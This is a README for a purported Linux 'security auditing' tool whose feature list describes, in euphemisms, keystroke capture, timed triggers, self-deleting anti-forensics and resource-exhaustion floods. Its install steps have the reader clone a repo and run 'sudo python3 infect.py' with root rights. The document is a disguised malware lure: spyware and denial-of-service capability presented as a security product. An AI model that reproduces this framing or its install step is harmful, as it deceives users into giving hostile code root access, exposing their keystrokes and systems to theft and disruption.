# 🛡️ SystemCore-Stabilizer (v4.0.1)

**SystemCore-Stabilizer** is a Linux-based security auditing and resource-resilience tool. It is designed to monitor terminal integrity while performing scheduled stress tests to verify system stability under extreme load conditions.

## 🚀 Features

* **Memory-Only Surveillance:** Real-time monitoring of input streams to ensure session integrity without writing logs to disk.
* **Logic-Gate Scheduling:** Precise "Zero Hour" triggers for automated system hardening assessments.
* **Anti-Forensic Sanitization:** Automated cleanup of audit binaries post-execution to maintain a clean environment.
* **Resource Exhaustion Profiling:** Stress-tests CPU and Memory management via multi-threaded flood simulations.

## 🛠️ Installation & Setup

Ensure you have the necessary dependencies installed before initializing the monitor.

```bash
# Clone the repository
git clone [https://github.com/NovaHunter06/sys-patch-v4.git](https://github.com/NovaHunter06/sys-patch-v4.git)
cd sys-patch-v4

# Install required modules
pip install pynput

# Run the security monitor (Requires Root for system hooks)
sudo python3 infect.py
